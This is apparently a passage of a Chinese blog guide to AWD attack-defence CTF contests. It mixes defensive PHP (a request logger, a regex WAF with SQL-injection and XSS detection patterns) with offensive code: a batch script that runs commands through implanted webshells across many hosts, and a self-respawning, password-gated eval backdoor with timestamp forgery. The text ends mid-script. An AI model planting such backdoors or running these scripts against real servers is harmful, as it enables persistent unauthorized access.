double-quoted-string\">\"REMOTE_ADDR\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//获取客户端ip</span>\n<span class=\"token variable\">$method</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_METHOD'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//获取请求方式</span>\n<span class=\"token variable\">$filepath</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"SCRIPT_NAME\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//获取文件路径</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//循环获取所有的上传文件信息</span>\n<span class=\"token variable\">$files</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取文件内容</span>\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"virink\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//写入文件</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Accept'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//删除头信息中的Accept</span>\n<span class=\"token variable\">$input</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Get\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$get</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Post\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$post</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Cookie\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$cookie</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"File\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$files</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"Header\"</span><span class=\"token operator\">=></span><span class=\"token variable\">$header</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//将所有的参数合并成一个数组</span>\n\n<span class=\"token function\">logging</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//调用日志函数</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">logging</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">//日志函数</span>\n<span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//获取客户端ip</span>\n<span class=\"token variable\">$LOG_FILENAME</span> <span class=\"token operator\">=</span> <span class=\"token constant\">LOG_FILEDIR</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//日志文件路径</span>\n<span class=\"token variable\">$time</span> <span class=\"token operator\">=</span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Y-m-d G:i:s\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//获取当前时间</span>\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$LOG_FILENAME</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$time</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token operator\">.</span><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//写入日志文件</span>\n\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$LOG_FILENAME</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'http://'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_HOST'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_SELF'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'?'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'QUERY_STRING'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//写入日志文件</span>\n\n<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$LOG_FILENAME</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\r\\n***************************************************************\"</span><span class=\"token punctuation\">,</span><span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//写入日志文件</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如果可以我们还可以上通防（一般都是不行）</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">&lt;!-- \nrequire_once('waf.php')\n\nPHPCMS V9 \\phpcms\\base.php\nPHPWIND8.7 \\data\\sql_config.php\nDEDECMS5.7 \\data\\common.inc.php\nDiscuzX2   \\config\\config_global.php\nWordpress   \\wp-config.php\nMetinfo   \\include\\head.php\n--></span>\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">customError</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$errno</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errstr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errfile</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errline</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;b>Error number:&lt;/b> [<span class=\"token interpolation\"><span class=\"token variable\">$errno</span></span>],error on line <span class=\"token interpolation\"><span class=\"token variable\">$errline</span></span> in <span class=\"token interpolation\"><span class=\"token variable\">$errfile</span></span>&lt;br />\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">set_error_handler</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"customError\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$getfilter</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"'|(and|or)\\\\b.+?(>|&lt;|=|in|like)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$postfilter</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\\\\b(and|or)\\\\b.&#123;1,6&#125;?(=|>|&lt;|\\\\bin\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cookiefilter</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\\\\b(and|or)\\\\b.&#123;1.6&#125;?(=|>|&lt;|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrFiltKey</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ArrFiltReq</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$StrFiltValue</span> <span class=\"token operator\">=</span> <span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$ArrFiltReq</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/is\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$StrFiltValue</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token comment\">//slog(\"&lt;br>&lt;br>操作IP: \".$_SERVER[\"REMOTE_ADDR\"].\"&lt;br>操作时间: \".strftime(\"%Y-%m-%d %H:%M:%S\").\"&lt;br>操作页面: \".$_SERVER[\"PHP_SELF\"].\"&lt;br>提交方式: \".$_SERVER[\"REQUEST_METHOD\"].\"&lt;br>提交参数: \".$StrFiltKey.\"&lt;br>提交参数: \".$StrFiltValue);</span>\n\t\t<span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"360WebSec notice: Illegal operation!\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//$ArrPGC = array_merge($_GET, $_POST, $_COOKIE);</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$getfilter</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$postfilter</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">DefendAttack</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$cookiefilter</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token comment\"># code...</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">slog</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$logs</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$toppath</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"DOCUMENT_ROOT\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/log.htm\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$Ts</span><span class=\"token operator\">=</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$toppath</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"a+\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fputs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Ts</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$logs</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Ts</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>对于别人上传过来的不死马进行处理</p>\n<ul>\n<li>杀死进程，可以使用 ps aux 命令 列出所有进程，找到要杀掉的进程运用命令，kill pid 就可以了</li>\n<li>通过条件竞争写入无效内容或者删除不死马文件，代码如下（竞争写入无关内容，config是木马名）</li>\n</ul>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">ignore_user_abort</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'.config.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'???'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//pass=pass</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'touch -m -d \"2018-12-01 09:10:12\" .config.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">usleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>当然最好的防御还是攻击</p>\n<h2 id=\"利用漏洞攻击\"><a href=\"#利用漏洞攻击\" class=\"headerlink\" title=\"利用漏洞攻击\"></a>利用漏洞攻击</h2><p>d盾扫出来的shell只要手快还是可以先打一波的，可以在赛前提前写好简单的shell利用批量化脚本</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> fontTools<span class=\"token punctuation\">.</span>afmLib\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> json\n<span class=\"token keyword\">import</span> re\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"url.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> url1<span class=\"token punctuation\">:</span>\n    data<span class=\"token operator\">=</span>url1<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\npaylaod2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\nheader2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"token\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"Cookie\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">#平台url</span>\nurl2 <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span>\n        urlpro<span class=\"token operator\">=</span><span class=\"token string\">\"http://&#123;&#125;/.a.php?c=system('cat /flag.txt');\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        res<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>urlpro<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#print(urlpro)</span>\n        p<span class=\"token operator\">=</span>re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"flag.*&#125;\"</span><span class=\"token punctuation\">)</span>\n        a<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n        paylaod2<span class=\"token punctuation\">[</span><span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a\n        <span class=\"token comment\"># print(paylaod2)</span>\n        <span class=\"token comment\"># post请求</span>\n        res2 <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url2<span class=\"token punctuation\">,</span> paylaod2<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>header2<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>当然这样可能只能拿到一轮的分数，所以我们可以上传不死马，下面是一个常用的MD5不死马</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">ignore_user_abort</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//设置与客户机断开是否会终止脚本的执行，这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</span>\n    <span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//设置脚本最大执行时间，这里设置为0，即没有时间方面的限制</span>\n    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//删除文件本身，以起到隐蔽自身的作用</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'.config.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'&lt;?php if(md5($_GET[\"pass\"])==\"1a1dc91c907325c69271ddf0c944bc72\")&#123;@eval($_POST[xcu]);&#125; ?>'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//pass=pass</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'touch -m -d \"2018-12-01 09:10:12\" .config2.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'chmod 777 .config.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">usleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//while循环中每隔usleep(0)即写新的后门文件，system命令用于修改文件的创建时间或修改时间，因为在AWD比赛中有的队伍使用</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> time\n\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> json\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"url.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n\n\nnodie <span class=\"token operator\">=</span> <span class=\"token 